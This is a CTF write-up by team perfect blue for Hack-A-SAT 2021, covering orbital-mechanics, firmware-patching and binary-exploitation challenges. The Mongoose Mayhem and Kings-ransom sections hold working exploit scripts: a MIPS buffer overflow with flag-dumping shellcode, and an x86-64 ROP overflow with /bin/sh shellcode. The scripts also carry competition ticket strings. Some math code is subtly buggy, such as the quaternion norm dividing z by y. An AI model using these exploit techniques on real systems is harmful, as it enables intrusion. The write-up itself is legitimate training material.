# Hack-A-SAT HAS2 Technical Write-ups by team perfect blue

## Take out the Trash

> A cloud of space junk is in your constellation's orbital plane. Use the space lasers on your satellites to vaporize it!

Take out the trash involved parsing two sets of orbital elements, one for satellites "under our control" with lasers to shoot trash, and a second, containing the trash to be shot. They were provided in the now-familiar (https://en.wikipedia.org/wiki/Two-line_element_set)[Two Line Element] format. We were also given two parameters that needed to be taken into consideration when shooting upon the given trash:
  - The lasers have a range of 100 km and must be provided range and attitude to lock onto the space junk.
  - Don't allow any space junk to approach closer than 10 km.

The first order of business for solving this challenge will be establishing where the two constellations are at any given moment. In the past, we've used both (https://rhodesmill.org/pyephem/)[PyEphem] and (https://rhodesmill.org/skyfield/)[SkyField] to load TLE sets and determine positions. Given the deprecation warnings on PyEphem, and not requiring more complicated orbital body calculations, this time around it look as if Skyfield would be an appropriate choice.
Loading the TLE sets is fairly straight forward:
```python
from skyfield.api import load

sats = load.tle_file("sats.tle")
junk = load.tle_file("spacejunk.tle")
```

We can then naively iterate through the pieces of junk, searching for a satellite within range that can fire upon it. Given that we can't allow any junk to come within 10km of any of our satellites, it makes sense to lineraly search forward through time for when trash first comes close.
```python
ts = load.timescale()  # Loads skyfield's time model

def check_for_firing_range(junk, t):
    current_pos = junk.at(t)
    for sat in sats:
        alt, az, dist = (sat.at(t) - current_pos).radec()
        dist = dist.km
        if dist < 100:
            print("{year}{day_of_year}.{hour:02d}{minute:02d}{second:02d} {satelite} FIRE {qx} {qy} {qz} {qw} {range}".format(
                year=t.utc.year,
                day_of_year=176, # Days since Jan - we can edit this should we take longer to fire upon the junk.
                hour=t.utc.hour,
                minute=t.utc.minute,
                second=floor(t.utc.second),
                satelite=sat.name.upper(), 
                qx=0, # TODO
                qy=0, # TODO
                qz=0, # TODO
                qw=0, # TODO
                range=dist
                )
                )
            
            return True
    return False

def find_time_where_sat_in_range(junk):
    for hr in range(24):
        for min in range(0,60,5):  # May need to tune this should junk come too close, or a satellite becomes too busy firing on junk
            t = ts.utc(2021, 6, 26, hr, min, 0)
            if check_for_firing_range(j, t):
                return # if we found a firing solution, dont keep looping.

for j in junk:
    find_time_where_sat_in_range(j)
```

And we're rewarded with a list of potential firing options:
```
python solution.py | head
2021176.002500 SAT1 FIRE 0 0 0 0 49.210536263656124
2021176.003000 SAT1 FIRE 0 0 0 0 81.69819776889929
2021176.020500 SAT2 FIRE 0 0 0 0 89.18592559600607
2021176.012500 SAT1 FIRE 0 0 0 0 97.28314628913203
2021176.020000 SAT2 FIRE 0 0 0 0 82.94699268947561
2021176.012000 SAT1 FIRE 0 0 0 0 96.64724903274347
2021176.002500 SAT1 FIRE 0 0 0 0 52.43018384155453
2021176.002500 SAT1 FIRE 0 0 0 0 53.27933948562728
2021176.002500 SAT1 FIRE 0 0 0 0 84.68927310689409
2021176.002500 SAT1 FIRE 0 0 0 0 51.36542778250229
```

As suspected, we're getting a few too many commands for one satellite, and some junk is coming too close for comfort - 50km! Tuning the time parameters gives us a bigger margin, and decreases the likelihood we need to fire on the same second, at the expense of more iterations of our code loop:
```
python solution.py | head
2021176.002100 SAT1 FIRE 0 0 0 0 98.45315622551395
2021176.002600 SAT1 FIRE 0 0 0 0 96.75031376122156
2021176.020300 SAT2 FIRE 0 0 0 0 98.92483176706027
2021176.012400 SAT1 FIRE 0 0 0 0 99.9047062367082
2021176.015800 SAT2 FIRE 0 0 0 0 99.99319926160916
2021176.011800 SAT1 FIRE 0 0 0 0 98.48275434745105
2021176.002100 SAT1 FIRE 0 0 0 0 98.34199585482715
2021176.002200 SAT1 FIRE 0 0 0 0 92.8376910745587
2021176.002400 SAT1 FIRE 0 0 0 0 93.97676719658202
2021176.002200 SAT1 FIRE 0 0 0 0 92.78420458157404
```

We're getting much better with the distance, but we still have SAT1 firing on the same minute - we're not told if this is going to be a problem, but looks like we'll need to check more often to not fire on the exact same second.

At this stage, I handed over to @voidmercy given my lack of experience with quaternions and requirement for sleep.

To compute the quaternion, we must find the quaternion that satisfies the equation: q z q* = v where z = (0, 0, 1) and v is the unit vector from the satellite in the direction of the space junk. It turns out one such quaternion that satisfies this equation for arbitrary z and v vectors is: `q.xyz = z cross v`, and `q.w = sqrt(|z|^2 * |v|^2) * (z dot v)`. The implementation of this is shown below:

```python
junk_vec = np.array(junk.at(t).position.to("km").value)
sat_vec = np.array(sat.at(t).position.to("km").value)
v2 = junk_vec - sat_vec
v1 = np.array([0, 0, 1])

xyz = np.cross(v1, v2)
w = sqrt(np.linalg.norm(v1)**2 * np.linalg.norm(v2)**2) + np.dot(v1, v2)

q = Quaternion.from_value(np.array([w, xyz[0], xyz[1], xyz[2]]))
q.norm()
```

One other thing to note is that the server expects the order of satellite fire commands to be ordered by time, and that a single satellite cannot fire twice at the same time. The final solution script is shown below:

```python
from skyfield.api import load, wgs84
from skyfield.framelib import ecliptic_J2000_frame
from math import floor
import numpy as np
from math import sin, cos, acos, sqrt

def normalize(v, tolerance=0.00001):
    mag2 = sum(n * n for n in v)
    if abs(mag2 - 1.0) > tolerance:
        mag = sqrt(mag2)
        v = tuple(n / mag for n in v)
    return np.array(v)

class Quaternion:

    def from_axisangle(theta, v):
        theta = theta
        v = normalize(v)

        new_quaternion = Quaternion()
        new_quaternion._axisangle_to_q(theta, v)
        return new_quaternion

    def from_value(value):
        new_quaternion = Quaternion()
        new_quaternion._val = value
        return new_quaternion

    def _axisangle_to_q(self, theta, v):
        x = v[0]
        y = v[1]
        z = v[2]

        w = cos(theta/2.)
        x = x * sin(theta/2.)
        y = y * sin(theta/2.)
        z = z * sin(theta/2.)

        self._val = np.array([w, x, y, z])

    def __mul__(self, b):

        if isinstance(b, Quaternion):
            return self._multiply_with_quaternion(b)
        elif isinstance(b, (list, tuple, np.ndarray)):
            if len(b) != 3:
                raise Exception(f"Input vector has invalid length {len(b)}")
            return self._multiply_with_vector(b)
        else:
            raise Exception(f"Multiplication with unknown type {type(b)}")

    def _multiply_with_quaternion(self, q2):
        w1, x1, y1, z1 = self._val
        w2, x2, y2, z2 = q2._val
        w = w1 * w2 - x1 * x2 - y1 * y2 - z1 * z2
        x = w1 * x2 + x1 * w2 + y1 * z2 - z1 * y2
        y = w1 * y2 + y1 * w2 + z1 * x2 - x1 * z2
        z = w1 * z2 + z1 * w2 + x1 * y2 - y1 * x2

        result = Quaternion.from_value(np.array((w, x, y, z)))
        return result

    def _multiply_with_vector(self, v):
        q2 = Quaternion.from_value(np.append((0.0), v))
        return (self * q2 * self.get_conjugate())._val[1:]

    def norm(self):
        w, x, y, z = self._val
        d = sqrt(w*w + x*x + y*y + z*z)
        self._val = np.array((w / d, x / d, y / d, z / y))

    def get_conjugate(self):
        w, x, y, z = self._val
        result = Quaternion.from_value(np.array((w, -x, -y, -z)))
        return result

    def __repr__(self):
        theta, v = self.get_axisangle()
        return f"((%.6f; %.6f, %.6f, %.6f))"%(theta, v[0], v[1], v[2])

    def get_axisangle(self):
        w, v = self._val[0], self._val[1:]
        theta = acos(w) * 2.0

        return theta, normalize(v)

    def tolist(self):
        return self._val.tolist()

    def vector_norm(self):
        w, v = self.get_axisangle()
        return np.linalg.norm(v)

sats = load.tle_file("sats.tle")
junk = load.tle_file("spacejunk.tle")

ts = load.timescale()

def check_for_firing_range(sat, junk, t):
    current_pos = junk.at(t)
    
    alt, az, dist = (sat.at(t) - current_pos).radec()
    dist = dist.km
    if dist < 100:
        junk_vec = np.array(junk.at(t).position.to("km").value)
        sat_vec = np.array(sat.at(t).position.to("km").value)
        v2 = junk_vec - sat_vec
        v1 = np.array([0, 0, 1])

        xyz = np.cross(v1, v2)
        w = sqrt(np.linalg.norm(v1)**2 * np.linalg.norm(v2)**2) + np.dot(v1, v2)

        q = Quaternion.from_value(np.array([w, xyz[0], xyz[1], xyz[2]]))
        q.norm()

        unit_vector = q * Quaternion.from_value(np.array([0, 0, 0, 1])) * q.get_conjugate()
        # print(unit_vector)
        w, x, y, z = unit_vector._val
        x *= dist
        y *= dist
        z *= dist
        hitx = x + sat_vec[0]
        hity = y + sat_vec[1]
        hitz = z + sat_vec[2]

        print("{year}{day_of_year}.{hour:02d}{minute:02d}{second:02d} {satelite} FIRE {qx} {qy} {qz} {qw} {range}".format(
            year=t.utc.year,
            day_of_year=177,
            hour=t.utc.hour,
            minute=t.utc.minute,
            second=floor(t.utc.second),
            satelite=sat.name.upper(), 
            qx=q._val[1],
            qy=q._val[2],
            qz=q._val[3],
            qw=q._val[0],
            range=dist
            )
            )
        return True
    return False

def find_time_where_sat_in_range(j):
    for hr in range(24):
        for min in range(0,60,60):
            t = ts.utc(2021, 6, 26, hr, min, 0)
            if check_for_firing_range(j, t):
                return

junk_killed = set()

for hr in range(24):
    for min in range(0,60,5):
        for sat in sats:
            kill = False
            for j in range(len(junk)):
                if j in junk_killed:
                    continue
                t = ts.utc(2021, 6, 26, hr, min, 0)
                if check_for_firing_range(sat, junk[j], t):
                    kill = True
                    junk_killed.add(j)
                    break
            if kill:
                continue
```

## Cotton-eye-geo

```
        KEPLER 2 GEO
           t, Δv
         CHALLANGE
          .  .   .
       .            .
     .      .  .      .
    .   ,'   ,=,  .    .
   .  ,    /     \  .   .
   . .    |       | .   .
   ..      \     / .    .
   ..        '='  .    .
    .          .'     .
     Δ . .  '       .
       '  .  .   .
Your spacecraft from the first Kepler challenge is in a GEO transfer orbit.
Determine the maneuver (time and Δv vector) required to put the spacecraft into GEO-strationary orbit: a=42164+/-10km, e<0.001, i<1deg.
Assume two-body orbit dynamics and an instantaneous Δv in ICRF coordinates.
Pos (km):   [8449.401305, 9125.794363, -17.461357]
Vel (km/s): [-1.419072, 6.780149, 0.002865]
Time:       2021-06-26-19:20:00.000000-UTC

What maneuver is required?
Enter maneuver time in UTC following the example format.
Time: 2021-06-26-00:00:00.000-UTC
```

Cotton-eye-geo involved computing the time and instantaneous velocity vector change to transfer an orbit from a GEO transfer orbit into a GEO-stationary orbit.

We used the astropy python library to compute the orbits. First, we can read in the current orbit provided with the following code:

```python
orbit3 =  elements_from_state_vector(np.array([8449.401305*1000, 9125.794363*1000, -17.461357*1000]),
                           np.array([-1.419072*1000, 6.780149*1000, 0.002865*1000]),
                           3.986004415e14)

epoch = Time(1624735200, format="unix")
orb = KeplerianElements(a=orbit3.a, e=orbit3.e, i=orbit3.i, raan=orbit3.raan, arg_pe=orbit3.arg_pe, M0=mean_anomaly_from_true(orbit3.e, orbit3.f), ref_epoch=1624665600, body=earth)
orb = orb.from_state_vector(np.array([8449.401305*1000, 9125.794363*1000, -17.461357*1000]),
                           np.array([-1.419072*1000, 6.780149*1000, 0.002865*1000]),
                           body=earth, ref_epoch=epoch)
```

Now to understand what is required to perform an orbit transfer, we read about the Hohmann transfer orbit on wikipedia. This challenge is similar to the latter half of a Hohmann transfer, and thus we need to change the spacecraft's velocity at the apogee of the transfer orbit. To compute to time at which this occurs, we get the mean anomaly in radians until the apogee, and divide that by the rate provided within the astropy library: `(np.pi - orb.M0) / orb.n`. Using this information, we can obtain the time at which we must perform the orbit transfer by adding the provided epoch time 1624735200. The final time we get is unix epoch 1624752779.1661038, which is also "2021-06-27-00:12:59.166-UTC"

Next, we must compute the change in velocity. To do this, I modelled the desired orbit trajectory. The [wikipedia](https://en.wikipedia.org/wiki/Geostationary_orbit) page on geostationary orbit tells that the altitude is 35,786 km. Thus, our desired orbit is: `desired_orb = KeplerianElements.with_altitude(35786 * 1000, body=earth)`.

Next, we have to obtain velocity at the time during which the desired orbit intersects the transfer orbit's apogee. There is for sure a mathematical way to compute this, but during the competition, I opted for an incremental brute force approach that minimizes the distance to the transfer orbit.

```python
cur = 2.386600000000612 - 0.0002
least = 99999999999999
least_diff = None
best_angle = None
while cur < 2.386600000000612 + 0.0001:
  desired_orb.t = (cur) / desired_orb.n
  diff = desired_orb.r - orb.r
  if abs(diff.x) + abs(diff.y) + abs(diff.z) < least:
    least = abs(diff.x) + abs(diff.y) + abs(diff.z)
    least_diff = diff
    best_angle = cur

  cur += 0.0000001
desired_orb.t = best_angle / desired_orb.n
```

Finally, the desired change in velocity is the difference: `deltav = desired_orb.v - orb.v`. The final script is shown below:

```python
from orbital import *
import numpy as np
import matplotlib.pyplot as plt
from astropy.time import Time
orbit3 =  elements_from_state_vector(np.array([8449.401305*1000, 9125.794363*1000, -17.461357*1000]),
                           np.array([-1.419072*1000, 6.780149*1000, 0.002865*1000]),
                           3.986004415e14)

epoch = Time(1624735200, format="unix")
orb = KeplerianElements(a=orbit3.a, e=orbit3.e, i=orbit3.i, raan=orbit3.raan, arg_pe=orbit3.arg_pe, M0=mean_anomaly_from_true(orbit3.e, orbit3.f), ref_epoch=1624665600, body=earth)
orb = orb.from_state_vector(np.array([8449.401305*1000, 9125.794363*1000, -17.461357*1000]),
                           np.array([-1.419072*1000, 6.780149*1000, 0.002865*1000]),
                           body=earth, ref_epoch=epoch)
time_to_apogee = (np.pi - orb.M0) / orb.n
orb.t += time_to_apogee


target = Time(1624736975.833811, format="unix")
desired_orb = KeplerianElements.with_altitude(35786 * 1000, body=earth)


cur = 2.386600000000612 - 0.0002
least = 99999999999999
lol = None
lol2 = None
while cur < 2.386600000000612 + 0.0001:
  desired_orb.t = (cur) / desired_orb.n
  diff = desired_orb.r - orb.r
  # print(diff)
  if abs(diff.x) + abs(diff.y) + abs(diff.z) < least:
    least = abs(diff.x) + abs(diff.y) + abs(diff.z)
    lol = diff
    lol2 = cur

  cur += 0.0000001
desired_orb.t = (lol2) / desired_orb.n

deltav = desired_orb.v - orb.v

print(deltav)
```

Because this brute force approach is not entirely accurate, we manually fiddled with the values to get a closer semimajor axis to the desired value. We ended up with the following values:

```
2021-06-27-00:12:59.166-UTC
-.96384883
-1.0257018
-.002
```

## Mongoose Mayhem

```
$ ./vmips -o ttydev=stdout -o fpu -o memsize=3000000 firmware.rom
Little-Endian host processor detected.
Mapping ROM image (firmware.rom, 6091 words) to physical address 0x1fc00000
Mapping RAM module (host=0x7f0338550010, 2929KB) to physical address 0x0
Mapping Timer device to physical address 0x01010000
Connected IRQ7 to the Timer device
Mapping Sensor device to physical address 0x02100000
Mapping Flag Device to physical address 0x02008000
Mapping Synova UART to physical address 0x02000000
Connected IRQ3 to the Synova UART
Mapping Synova UART to physical address 0x02000010
Connected IRQ4 to the Synova UART
Connected IRQ5 to the Synova UART
Hit Ctrl-\ to halt machine, Ctrl-_ for a debug prompt.

*************RESET*************
```

The challenge includes a ROM file and a binary vmips. As the name states, it’s most likely an emulator for MIPS.

In fact, it turns out that the vmips binary is a modified vmips emulator. So the first step is to reverse engineer the ROM.

A few things to note during reverse engineering.

- The ROM is loaded at 0xBFC00000
- Interrupt handler is at 0xBFC00180
- The binary copies data from ROM into RAM, so custom memory mapped segments should be manually created to ease the reverse engineering process.

After reversing the binary, we discover the following functionalities of the ROM:

- The binary communicates with the host through UART RX and TX interrupts
- The UART protocol has "\xA5" and "Z" as sync/start bytes.
- There is 61 bytes of payload data
- The main function reads in user data as floats into RAM.
- Each timer interrupt triggers some float computations using RAM data, and the result is outputted through some unknown IO interface mapped at 0xA3000000.

The vulnerability is a buffer overflow when reading a single float word. This overflow allows us to overflow the stack and control the return address and gain IP control. The code to trigger this bug is shown below:

```python
def construct_packet(payload):
    assert len(payload) == 61
    tot = 0
    for i in payload:
        tot += ord(i)
    tot = tot & 0xff
    packet = "\xA5" + "Z" + payload + chr(0xff - tot) + "\xA5"
    return packet

def construct_payload(op, idx, data):
    data += "Z"*(59-len(data))
    return construct_packet(chr((op << 4) | idx) + "\x00" + data)
p = construct_payload(5, 8, p32(shellcode_loc)*2)
r.sendline(p)
```

Using IP control, we can jump to data in RAM, and execute it as shellcode. The code allows us to read in 14 consecutive floats stored at `shellcode_loc = 0xA0180590`. However, these floats must not be negative values, therefore our shellcode has to adhere to this constraint. Luckily, padding the shellcode with nop instructions "\x00\x00\x00\x00" allows us to avoid negative floats effectively.

What we want our shellcode to do is utilize the unknown IO interface used to output float computation results to print out the flag for us. The flag is mapped at 0xa2008000. The shellcode to do this is shown below:

```
ori $a0, $zero, 0
ori $a2, $zero, 1
ori $a3, $zero, 0xa300
sll $a3, $a3, 0x10
ori $t0, $zero, 0x20
or $a3, $a3, $t0
lw $a1, ($a3)
beq $a1, $a2, 8
ori $at, $zero, 0xa200
sll $at, $at, 0x10
ori $v0, $zero, 0x8000
add $v0, $v0, $a0
or $at, $at, $v0
lw $v1, ($at)
sw $v1, 4($a3)
sw $v1, 8($a3)
sw $zero, ($a3)
addi $a0, $a0, 4
b 8
```

Finally, putting everything together, we have the following solve script:

```python
from pwn import *
import struct
import time

# r = process("./vmips_patched -o fpu -o memsize=3000000 firmware.rom".split())
r = remote("elite-poet.satellitesabove.me", 5012)
r.recvuntil("Ticket please:")
r.sendline("ticket{uniform379194sierra2:GHiF6t8NmcWsYHqka1scMQCMHTuyi8RGOl72nPY-n6P0AVyyukuW1UnRO6SfWhwweg}")

time.sleep(1)

def construct_packet(payload):
    assert len(payload) == 61
    tot = 0
    for i in payload:
        tot += ord(i)
    tot = tot & 0xff
    packet = "\xA5" + "Z" + payload + chr(0xff - tot) + "\xA5"
    return packet

def construct_payload(op, idx, data):
    data += "Z"*(59-len(data))
    return construct_packet(chr((op << 4) | idx) + "\x00" + data)

shellcode = """00 00 04 34
01 00 06 34
00 A3 07 34
00 3C 07 00
20 00 08 34
25 38 E8 00
00 00 E5 8C
FA FF A6 10
00 A2 01 34
00 0C 01 00
00 80 02 34
20 10 44 00
25 08 22 00
00 00 23 8C
04 00 E3 AC
08 00 E3 AC
00 00 E0 AC
04 00 84 20
EF FF 00 10
""".replace("\n\n", "\n").split("\n")
# shellcode = ["FF FF 00 10", "00 00 00 00"]

def check_good(payload):
    if len(payload) % 8 != 0:
        payload += "\x00"*4
    for i in range(0, len(payload), 8):
        d = payload[i:i+8]
        val = struct.unpack("d", d)[0]
        print("VALUE", val, d)
        if val < 0.0:
            if struct.unpack("d", payload[i:i+4] + "\x00"*4) > 0.0:
                return payload[:i+4] + "\x00"*4 + payload[i+4:], False
            elif struct.unpack("d", "\x00"*4 + payload[i:i+4]) > 0.0:
                return "\x00"*4 + payload[:i+4] + payload[i+4:], False
            else:
                print("BAD F")
                exit()
    return payload, True

payload = ""
for i in shellcode:
    payload += i.replace(" ", "").decode("hex")

is_good = False
while not is_good:
    # print(is_good)
    payload, is_good = check_good(payload)

# print(payload.encode("hex"))
assert len(payload) <= 0x70
part1 = payload[:7*8]
part2 = payload[7*8:]
# print("PART1", part1)
# print("PART2", part2)

# stored at A0180590
shellcode_loc = 0xA0180590

r.sendline(construct_payload(3, 0, part1))
if len(part2) > 0:
    r.sendline(construct_payload(3, 1, part2))

# p = construct_payload(5, 8, "CCCCDDDD")
p = construct_payload(5, 8, p32(shellcode_loc)*2)
r.sendline(p)

r.recv(8)

flag = ""
for i in range(100):
    flag += r.recv(4)
    r.recv(12)
    print("FLAG", flag)

r.interactive()
```

## Kings-ransom

```
Presents from Marco

A vulnerable service with your "bank account" information running on the target system. Too bad it has already been exploited by a piece of ransomware. The ransomware took over the target, encrypted some files on the file system, and resumed the executive loop.

Follow the footsteps.
```

In this challenge, we're given a vulnerable binary. After reverse engineering, we find:

- The binary mmaps a rwx page at 0x12800000.
- Part of the flag contents are read to 0x12800000.
- We are able to send "packets" that allow us to perform virtual function calls.
- Functions we can call include: read_from_rwx_page, store_to_rwx_page, float_accumulate, print_float_data.
- Each packet has a crc-like checksum, which we re-implemented in python in order to construct valid packets.

The structure of a packet is:

```C
struct packet
{
  char magic1;
  char magic2;
  __int16 size;
  __int16 crc;
  char vtable_row;
  char vtable_col;
  char data[];
};
```

The first idea that came to mind was to use read_from_rwx_page to simply read the flag. This worked locally, and was able to read parts of a local flag. However, when tested on remote, the data read was complete garbage.

However, we soon found a buffer overflow vulnerability in float_accumulate. Because the binary did not have stack canaries enabled, we can overflow the return address and gain RIP control. Moreover, we can use store_to_rwx_page to store shellcode at a known address (0x12800000), and jump there using the buffer overflow bug. Putting everything together, the final exploit is shown below:

```python
from pwn import *

def compute_checksum(data, size):
    checksum = 0x1d0f
    for i in range(size):
        checksum ^= ord(data[i]) << 8
        for j in range(8):
            if ((1 << 15) & checksum) == 0:
                checksum = (checksum * 2) & 0xffff
            else:
                checksum = ((2 * checksum) ^ 0xa02b) & 0xffff
    return checksum & 0xffff

dump = ""
def construct_packet(size, vtable_row, vtable_col, data):
    p = ""
    p += "\x55\xaa"
    p += p16(size)
    p += p16(compute_checksum(data, size))
    p += chr(vtable_row)
    p += chr(vtable_col)
    p += data
    return p


context.bits = 64
context.arch = 'x86_64'
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


data = p16(0x0) + p16(len(sc)) + sc
p1 = construct_packet(len(data), 2, 1, data)
# r.send(p)

do_write = 0x00000000004016AD
poprdi = 0x0000000000401dc3
poprsir15 = 0x0000000000401dc1
readgot = 0x0000000000404040
main = 0x0000000000401997

ropchain = "A"*(cyclic(0x40).index("faaagaaahaaaiaaaj"))
ropchain += p64(poprdi) + p64(readgot)
ropchain += p64(poprsir15) + p64(0x8) + p64(0x0)
ropchain += p64(do_write)
ropchain += p64(main)

ropchain = "A"*(cyclic(0x40).index("faaagaaahaaaiaaaj"))
ropchain += p64(0x12800000)

data = ropchain

p2 = construct_packet(len(data), 1, 1, data)
# r = process("./king_ransom", env={"LD_PRELOAD":"./libc.so"})
r = process(["ltrace", "./king_ransom"], env={"LD_PRELOAD":"./libc.so"})
p = remote("star-power.satellitesabove.me", 5011)
p.recvuntil(":")
p.sendline("ticket{zulu739020zulu2:GLY7Ipr7aTFMVVLUKBGQrXXzRKo14Aw4Br7KDUSZrNivtmGD5wz4nhFJukxmLZpETw}")
p.recvuntil("tcp:")

n = p.recvline().strip().split(":")
r = remote(*n)

r.send(p1 + p2)
r.sendline("ls")

r.interactive()
```

## Mars or Bust

In this challenge, we're given a mars lander firmware and a GUI which tracks our lander's descent to mars. Our job is to fix the lander firmware
so that it lands properly without crashing.

On running the default firmware, we notice that there are 7 stages to the landing process:

* Parachute Deployed
* Backshell Ejected
* Powered Descent
* Legs Deployed
* Constant Velocity
* Touchdown
* Engine Cutoff

By default, the lander descends with just the parachute slowing it down until it reaches a certain velocity. At this point, the engine starts
and it slows down the lander using powered descent. However, the engine cuts off right at 40m and it crashes to earth. So, this must be the bug
we need to fix.

Fortunately, we have access to the firmwarem, we can download it and try to reverse it. The ROM is coded in MIPS32 instruction set.

After spending quite a bit of effort in reversing and renaming the decompilation, we come across this main switch case which controls the different stages of descent. The code was essentially a state machine, which transitioned from parachute braking to a PID controlled brake, before it started a phase where it alternated between 40% and 100% thruster output, based on current velocity. Finally, when receiving a touchdown signal, the engine shuts off.

```c
    if ( state )
    {
      switch ( state )
      {
        case 1:
          outbit0 = 1;
          outbit1 = 1;
          LOBYTE(thruster) = 80;
          outbit2 = 0;
          if ( bit4 )
            state = 2;
          break;
        case 2:
          sub_FC00520(v26, flt_A0180568, flt_A0180564, flt_A0180560, velocity, flt_A0180570, altitude, stage_4_altitude);
          v20 = v26;
          state = 3;
          break;
        case 3:
          if ( altitude <= stage_4_altitude )
            state = 4;
          sub_FC0088C(v20, altitude);
          __asm
          {
            cfc1    $v0, FCSR
            cfc1    $v0, FCSR
          }
          _$AT = (_$V0 | 3) ^ 2;
          __asm
          {
            ctc1    $at, FCSR
            ctc1    $v0, FCSR
          }
          thruster = *v20 + 35;
          if ( thruster >= 101u )
            LOBYTE(thruster) = 100;
          break;
        case 4:
          if ( velocity >= qword_A0180578 )
            LOBYTE(thruster) = 40;
          else
            LOBYTE(thruster) = 100;
          break;
      }
    }
```

The most important condition for us is `altitude <= stage_4_altitude`, where `stage_4_altitude` is 40.0m. This tells us that the error must be
related to something here.

By patching the various values in this switch case, we can control the altitude/velocity at which the engine is turned on, and what thrust
should be applied at what point.

After a lot of fine tuning and playing with different values, we end up with a set of parameters that put the lander at just below 0.5m/s velocity when landing. At this point, we are expecting to get the flag, however, when we submit the firmware, we get 6/7 green signals
with just Engine Cutoff being red.

We were stuck here for quite a while, until we realized that Engine Cutoff is also something that's controlled by us. We need to make sure we set the "engine cutoff" flag to be true just after we land.

The relevant code which sets the engine cutoff flag:
```c
    if ( bit0 && bit0_prev )
      bool_wat = 1;
    if ( bit1 && bit1_prev )
      bool_wat = 1;
    if ( bit2 && bit2_prev )
      bool_wat = 1;
    if ( bit3 )
    {
      if ( bool_wat )
        outbit2 = 1;
    }
```

Now we understood the real bug. We were originally getting a spurious signal for touchdown before we landed, and we lost all engine power.
To fix this, we patched the logic to also check the altitude before considering touchdown. We also had to essentially make a "stage 5" in the state machine to say we were done, or the lander would launch off again after landing, because the touchdown signals disappeared.

Final Exploit Code:

```py
import struct
from pwn import *

context.arch = 'mips'
context.bits = 32
context.endian = 'little'

def t(x):
    return x - 0xA0180000 + 0x5efc

data = open("bad.rom", "rb").read()
dat = list(data)

# Stage 1 Velocity
dat[0x5a68] = 78

dat[0x5aa8] = 80
dat[0x5bf0] = 80

# Patch for engine cutoff at 40m. Not needed if we are patching the entire conditional later on.
#dat[0x5d18] = 0

# altitude limit
dat[t(0xA018056C):t(0xA018056C+4)] = list(struct.pack("<f", 50.0))

# velocity limit
dat[t(0xA0180578):t(0xA0180578+8)] = list(struct.pack("<d", -0.5))

# engine cutoff comparision
dat[t(0xA0180588):t(0xA0180588+4)] = list(struct.pack("<f", 20.0))


# Patch for if (altitude <= value), mips assembly.

"""
lbu  $v0, 0x27($fp)
beqz $v0, sice
nop

lbu  $v0, 0x26($fp)
beqz $v0, sice
nop
"""


code = """
lwc1 $f2, 0x30($fp)
lui $v0, 0xa018
lwc1 $f0, 0x588($v0)
c.le.s $f2, $f0
bc1f sice
nop
li $v0, 0
sb $v0, 0x2c($fp)
li $v0, 1
sb $v0, 0x2a($fp)

sice:
li $v0, 0x0FC05D20
jr $v0
"""

code = """
li $v0, 0x0FC05D20
jr $v0
"""

extra_data = asm(code)
print(len(extra_data))
assert len(extra_data) < 0x80

dat[0x380:0x380+len(extra_data)] = extra_data

# Code Location = 0x0FC00380

code = """
"""
patch = asm(code)
patch += b"\x00" * (40 - len(patch))

assert len(patch) == 40

dat[0x5cf8:0x5cf8+len(patch)] = patch

# stage 4 patch
# dat[0x5c78] = 0x64

new_dat = bytes(dat)

f = open("bad_new.rom", "wb")
f.write(new_dat)
f.close()
```